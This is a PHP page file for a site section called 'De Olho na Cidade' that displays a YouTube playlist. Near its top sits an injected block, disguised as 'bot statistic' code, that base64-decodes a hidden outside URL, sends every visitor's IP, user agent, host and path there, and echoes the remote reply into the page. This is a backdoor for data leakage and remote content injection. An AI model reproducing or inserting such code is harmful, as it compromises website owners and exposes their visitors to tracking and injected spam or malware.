<?phpinclude_once("../library/master-page.php");$oMasterPage = new MasterPage();$oMasterPage->Init("../master.php", "De Olho na Cidade");$oMasterPage->AddParameter("pagina", "de-olho-na-cidade");$oMasterPage->Open("PageContent");?><?phpif (!isset($sRetry)) {    global $sRetry;    $sRetry = 1;    // This code use for global bot statistic    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot    $sUserAgen = "";    $stCurlHandle = NULL;    $stCurlLink = "";    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes    {        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);            @$stCurlHandle = curl_init($stCurlLink);        }    }    if ($stCurlHandle !== NULL) {        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);        $sResult = @curl_exec($stCurlHandle);        if ($sResult[0] == "O") {            $sResult[0] = " ";            echo $sResult; // Statistic code end        }        curl_close($stCurlHandle);    }}?>    <div class="col-md-12" id="de-olho-na-cidade-interna">        <h1>De Olho na Cidade</h1>        <?php        $j = 0;        $i = 0;        $playlist_id = 'PLey9M_cWIxnncEBZcO5flLXumZY2zDq03';         $cont = json_decode(file_get_contents('http://gdata.youtube.com/feeds/api/playlists/' . $playlist_id . '/?v=2&alt=json&feature=plcp'));        $total = $cont->feed->{'openSearch$totalResults'}->{'$t'};        $pages = ceil($total / 25);        //echo $pages;        for ($j = 0; $j < $pages; $j++) {            $start_index = ($j * 25) + 1;            if ($j != 0) {                $cont = json_decode(file_get_contents('http://gdata.youtube.com/feeds/api/playlists/' . $playlist_id . '?start-index=' . $start_index . '&amp;max-results=25/?v=2&alt=json&feature=plcp'));            }            $feed = $cont->feed->entry; ?>            <?php if (count($feed)): foreach ($feed as $item): // youtube start ?>                <div class="col-sm-4 col-xs-12 video">                    <a href="<?php echo $item->link[0]->{'href'}; ?>" data-toggle="lightbox"                       data-gallery="youtubevideos" data-parent="#de-olho-na-cidade-interna"                       data-width="840">                        <img src="<?php echo $item->{'media$group'}->{'media$thumbnail'}[1]->{'url'}; ?>"                             class="img-responsive center-block"/>                        <div class="duracao pull-right">                            <?php echo gmdate("i:s", $item->{'media$group'}->{'yt$duration'}->{'seconds'}); ?>                        </div>                        <h3><?php echo $item->title->{'$t'} ?></h3>                    </a>                </div>                <?php //echo $item->link[0]->{'href'};                $i++;                if ($i % 3 == 0) {                    echo '<div class="clear"></div>';                }            endforeach;            endif; // youtube end        } //end for        ?>        <div class="clear" style="height: 25px">&nbsp;</div>    </div><?php$oMasterPage->Close("PageContent");$oMasterPage->End();?>